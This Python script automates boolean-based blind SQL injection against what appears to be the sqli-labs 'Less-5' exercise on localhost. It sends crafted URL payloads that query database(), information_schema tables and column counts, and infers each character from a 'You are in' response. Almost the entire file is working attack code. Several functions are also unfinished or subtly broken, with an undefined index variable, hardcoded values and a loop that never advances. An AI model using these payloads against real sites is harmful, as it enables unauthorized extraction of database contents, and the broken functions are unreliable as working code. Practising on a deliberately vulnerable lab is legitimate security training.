from urllib.parse import unquote
from typing import *

import requests
import re
import time

# Author: HackHuang
# Description: For Less-5
# Last Modified: 2024/12/03 23:15

LAB_ROOT_URL: Final = 'http://localhost:8001'
SQL_COMMENT: Final  = '--+'

def url_decoder(url: str) -> str:
    decoded_url: str = unquote(url)
    return decoded_url

def get_method(url: str, pattern: str) -> bool:
    reponse = requests.get(url=url)
    return True if re.search(pattern=pattern, string=reponse.text) else False

def binary_search() -> None:
    pass

def get_db_name_len(url: str, pattern: str) -> int:
    len: int = 0
    while True:
        url_str: str = LAB_ROOT_URL + url + str(len) + SQL_COMMENT
        print(f'Try to get the db name length ---> {url_str}')
        if get_method(url=url_str, pattern=r'You are in'):
            break
        len = len + 1
    return len

def get_db_name(url: str, pattern: str, db_name_len: int) -> str:
    db_name_char_list: List = []
    db_name_char_ascii: int = 97
    left_index = 1
    while len(db_name_char_list) < db_name_len:
        url_str: str = LAB_ROOT_URL + url + f"substr(database(), {left_index}, 1)>" + f"'{chr(db_name_char_ascii)}'" + SQL_COMMENT
        print(f'Try to get db name ---> {url_str}')
        if get_method(url=url_str, pattern=pattern):
            db_name_char_ascii = db_name_char_ascii + 1
        else:
            db_name_char_list.append(chr(db_name_char_ascii))
            left_index = left_index + 1
            db_name_char_ascii = 97
            print(f'Updated db_name_char_list: {db_name_char_list}')
    return ''.join(e for e in db_name_char_list)

def get_table_num(url: str) -> int:
    table_num: int = 0
    while True:
        url_str: str = LAB_ROOT_URL + url + str(table_num) + ')' + SQL_COMMENT
        print(f'Try to get the table number ---> {url_str}')
        if get_method(url=url_str, pattern=r'You are in'):
            return table_num + 1
        table_num = table_num + 1

def get_table_name_len(table_num: int) -> List[int]:
    table_name_len: int = 0
    table_name_len_list: List = []
    limit_begin_index: int = 0
    while len(table_name_len_list) < table_num:
        url = f"/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit {limit_begin_index},1))="
        url_str: str = LAB_ROOT_URL + url + str(table_name_len) + SQL_COMMENT
        print(f'Try to get the table name length ---> {url_str}')
        if get_method(url=url_str, pattern=r'You are in'):
            table_name_len_list.append(table_name_len)
            table_name_len = 0
            limit_begin_index = limit_begin_index + 1
        table_name_len = table_name_len + 1
    return table_name_len_list

def get_table_name(pattern: str, table_name_len_list: List) -> List:
    table_name_list: List = []
    limit_begin_index: int = 0
    for table_name_len in table_name_len_list:
        table_name: str = ''
        table_name_char_ascii: int = 97
        substr_begin_index: int = 1
        while len(table_name) < table_name_len:
            url: str = f"/Less-5/?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit {limit_begin_index},1), {substr_begin_index}, 1) = '{chr(table_name_char_ascii)}'"
            url = LAB_ROOT_URL + url + SQL_COMMENT
            print(f'Try to get the table name ---> {url}')
            if get_method(url=url, pattern=pattern):
                table_name = table_name + chr(table_name_char_ascii)
                substr_begin_index = substr_begin_index + 1
                table_name_char_ascii = 97
                print(f'Updating the table_name: {table_name}')
                continue
            table_name_char_ascii = table_name_char_ascii + 1
        table_name_list.append(table_name)
        print(f'The table name had been got: {table_name_list}')
        limit_begin_index = limit_begin_index + 1
    return table_name_list

def get_column_num(table_name_list: List, pattern: str) -> Dict[str, int]:
    column_num_dict: Dict = {}
    for table_name in table_name_list:
        column_num: int = 0
        while True:
            url_str: str = f"/Less-5/?id=1' and (select length(group_concat(column_name)) - length(replace(group_concat(column_name), ',', '')) from information_schema.columns where table_name ='{table_name}') = {column_num}"
            url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
            print(f'Try to get the column num: {url_str}')
            if get_method(url=url_str, pattern=pattern):
                column_num_dict[table_name] = column_num + 1
                break
            column_num = column_num + 1
        print(f'The column num had been got: {column_num_dict}')
    return column_num_dict

# TODO
def get_column_name_len(column_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[int, List[int]]]:
    column_name_len_dict: Dict[str, Dict[int, List[int]]] = {}
    for table_name, table_colmun_num in column_num_dict.items():
        temp_column_name_len: int = 0
        temp_limit_begin_index: int = 0
        temp_column_name_list: List[int] = []
        while len(temp_column_name_list) < table_colmun_num:
            url: str = f"/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name = 'users' limit {limit_begin_index}, 1)) = 2"
            url = LAB_ROOT_URL + url + SQL_COMMENT
            print(f'Try to get the column name len: {url}')
            if get_method(url=url, pattern=pattern):
                temp_column_name_list.append(temp_column_name_len)
                temp_limit_begin_index = temp_limit_begin_index + 1
            temp_column_name_len = temp_column_name_len + 1
        column_name_len_dict[table_name] = {table_colmun_num: temp_column_name_list}
        print(f'The column name len had been got: {column_name_len_dict}')
    return column_name_len_dict

# TODO
def get_column_name(pattern: str, column_name_len_list: List[int], table_name_list: List[str]) -> List:
    column_name_list: List = []
    limit_begin_index: int = 0
    for column_name_len in column_name_len_list:
        column_name: str = ''
        column_name_char_ascii: int = 97
        sub_begin_index: int = 1
        while len(column_name) < column_name_len:
            url: str = "/Less-5/?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0, 1), 1, 1)='i'"
            url = LAB_ROOT_URL + url + SQL_COMMENT
            pass
    return []

def get_data_len() -> None:
    pass

def get_data() -> None:
    pass

# Decoded URL: http://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)>'a'--+
# print(f"Decoded URL: {url_decoder("http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(database(),1)%3E%27a%27--+")}")

# db_name_len: int = get_db_name_len(url="/Less-5/?id=1'and length(database())=")
# print(f'The db name length: {db_name_len}')

# db_name: str = get_db_name(url="/Less-5/?id=1' and ", pattern=r'You are in', db_name_len=8)
# print(f'The db name: {db_name}')

# table_num: int = get_table_num(url="/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) -LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = ")
# print(f'The table number: {table_num}')

# table_name_len_list: List = get_table_name_len(table_num=4)
# print(f'The table name length: {table_name_len_list}')

get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
print(f'The table name list: {table_name_list}\n\n')

column_num_dict = get_column_num(table_name_list=table_name_list, pattern='You are in')
print(f'The column num dict: {column_num_dict}')
